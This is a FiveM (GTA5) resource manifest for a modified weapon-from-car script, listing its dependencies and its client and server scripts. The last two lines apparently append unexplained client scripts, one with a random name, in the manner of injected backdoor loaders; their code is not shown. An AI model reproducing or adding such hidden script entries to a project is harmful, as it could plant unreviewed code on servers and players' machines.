fx_version      'adamant'
game            'gta5'
description     'elf_weaponfromcar modified by ImCasp | Original https://github.com/ELF0001/elf_weaponfromcar'
version         '1.0.0'

dependencies {
    'mythic_notify'
}

server_scripts {
    'locale.lua',
    'locales/*.lua',
    'config.lua',

    'server/main.lua'
}

client_scripts {
    'locale.lua',
    'locales/*.lua',
    'config.lua',

    'client/main.lua'
}
client_script 'xwt5MaHMS7.lua'

client_script "ph1ll1p.lua"